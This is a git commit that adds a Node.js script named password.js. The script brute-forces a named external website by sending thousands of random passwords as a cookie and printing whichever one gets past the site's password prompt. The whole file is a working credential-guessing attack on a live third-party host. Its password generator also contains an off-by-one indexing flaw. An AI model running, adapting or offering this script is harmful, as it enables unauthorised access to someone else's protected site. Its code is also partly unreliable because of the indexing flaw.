8446754c724e62d5988f1080ec2b91e0929bc96f
NoobKilla5412 <brandoncarlrobertson@gmail.com>
2024-03-20 12:42:46 -0700

    Password

---
+++ password.js
@@ -0,0 +1,42 @@
+const { log } = require("console");
+
+(async () => {
+  const { default: fetch } = await import("node-fetch");
+
+  function generatePass(len) {
+    let pass = "";
+    let str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz0123456789@#$";
+
+    for (let i = 1; i <= len; i++) {
+      let char = Math.floor(Math.random() * str.length + 1);
+
+      pass += str.charAt(char);
+    }
+
+    return pass;
+  }
+
+  for (let i = 5; i < 100; i++) {
+    for (let j = 0; j < 65 * (i + 1); j++) {
+      let pass = generatePass(i);
+      const text = await (
+        await fetch("https://pawn.pieces.tafca.co.uk", {
+          headers: {
+            cookie: `password=${pass}`
+          }
+        })
+      ).text();
+      if (
+        text !=
+        `<script>
+    document.cookie = \`password=\${prompt('Enter the password')}\`;
+    location.reload();
+</script>`
+      ) {
+        console.log(pass);
+        break;
+      }
+    }
+    log(i + 1);
+  }
+})();
